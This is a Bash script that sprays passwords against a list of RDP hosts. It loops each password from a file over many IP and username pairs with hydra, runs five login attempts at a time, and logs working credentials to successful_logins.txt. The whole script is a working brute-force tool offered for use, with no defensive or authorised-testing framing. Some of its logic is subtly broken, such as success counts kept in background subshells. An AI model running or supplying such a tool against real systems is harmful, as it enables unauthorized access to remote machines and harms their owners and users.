#!/bin/bash

# Define input and output files
iplog_file="iplog.txt"
passwords_file="passwords.txt"
success_log_file="successful_logins.txt"
temp_passwords_file="temp_passwords.txt"

# Create missing files if they don't exist
[[ ! -f "$iplog_file" ]] && touch "$iplog_file"
[[ ! -f "$passwords_file" ]] && touch "$passwords_file"
[[ ! -f "$success_log_file" ]] && touch "$success_log_file"
[[ ! -f "$temp_passwords_file" ]] && touch "$temp_passwords_file"

# Function to clean up before exiting (does not modify passwords.txt)
cleanup() {
    echo "Saving current state of passwords..."
    mv "$temp_passwords_file" "$passwords_file"
    exit
}

# Trap signals to call cleanup function
trap cleanup SIGINT SIGTERM

# Check if the input files exist
if [[ ! -f "$iplog_file" || ! -f "$passwords_file" ]]; then
    echo -e "\e[31mOne or both files do not exist, exiting.\e[0m"
    exit 1
fi

# Read RDP entries and passwords
mapfile -t iplog_entries < "$iplog_file"
mapfile -t passwords < "$passwords_file"

successful_attempts=0
total_passwords=${#passwords[@]}
total_hosts=${#iplog_entries[@]}  # Total number of hosts
start_time=$(date +%s)

# Function to attempt login
attempt_login() {
    local entry="$1"
    local password="$2"

    # Parse the entry for IP and username
    if [[ $entry =~ rdp://([^:]+):(.+) ]]; then
        rdp_ip="${BASH_REMATCH[1]}"
        username="${BASH_REMATCH[2]}"
    else
        echo "Invalid entry format: $entry"
        return
    fi

    # Run hydra and capture the output
    hydra_output=$(hydra -l "$username" -p "$password" "$rdp_ip" rdp -t 4 -W 3 2>&1)

    # Check for specific success indicators in the output
    if echo "$hydra_output" | grep -q "success"; then
        echo "$(date '+%Y-%m-%d %H:%M:%S') - Successful login with $username on rdp://$rdp_ip using password: $password" >> "$success_log_file"
        ((successful_attempts++))
    fi
}

# Loop through each password and check against all entries
for index in "${!passwords[@]}"; do
    password="${passwords[index]}"
    current_line=$((index + 1))

    echo -e "$(date '+%Y-%m-%d %H:%M:%S') - Currently checking password: $password (Line $current_line of $total_passwords)"

    # Start timer for this password
    password_start_time=$(date +%s)
    attempts=0  # Counter for successful attempts with the current password

    for entry in "${iplog_entries[@]}"; do
        # Attempt login
        attempt_login "$entry" "$password" &

        # Limit to 5 concurrent jobs to reduce load
        while (( $(jobs -r -p | wc -l) >= 5 )); do
            wait -n  # Wait for at least one job to finish
        done

        ((attempts++))
    done

    # Wait for all background jobs to finish for this password
    wait

    # End timer for this password
    password_end_time=$(date +%s)
    password_duration=$(( password_end_time - password_start_time ))

    # Calculate speed of attempts (in seconds per attempt)
    if (( attempts > 0 )); then
        speed=$(bc -l <<< "scale=2; $password_duration / $attempts")  # Calculate speed as duration divided by attempts
    else
        speed="N/A"  # If no attempts, set speed to N/A
    fi

    # Indicate that the password has been checked and remove it from the list
    echo "$password was deleted from the list of passwords (Lines left: $((total_passwords - (index + 1))))"
    echo -e "Time taken for password '$password': $password_duration seconds, Speed: $speed seconds/attempt."

    # Save the checked password for final cleanup
    echo "$password" >> "$temp_passwords_file"  
done

# Wait for any remaining background jobs
wait

# Move the temp_passwords_file back to passwords_file only if it is different
if ! cmp -s "$temp_passwords_file" "$passwords_file"; then
    mv "$temp_passwords_file" "$passwords_file"
else
    rm "$temp_passwords_file"
fi

# Calculate elapsed time and estimate remaining time
end_time=$(date +%s)
elapsed_time=$(( end_time - start_time ))
avg_time_per_password=$(( elapsed_time / (successful_attempts > 0 ? successful_attempts : 1) ))
remaining_passwords=$(wc -l < "$passwords_file")
estimated_time=$(( remaining_passwords * avg_time_per_password ))

# Final report
echo -e "\n\e[36m----------------------------------------\e[0m"
echo -e "\e[36mTotal Successful Logins: \e[32m$successful_attempts\e[0m"
echo -e "\e[36mEstimated time remaining: \e[33m$(printf '%d:%02d:%02d' $((estimated_time/3600)) $(( (estimated_time%3600)/60 )) $((estimated_time%60)))\e[0m"

# Log the total count of successful logins
echo "$(date '+%Y-%m-%d %H:%M:%S') - Total Successful Logins: $successful_attempts" >> "$success_log_file"
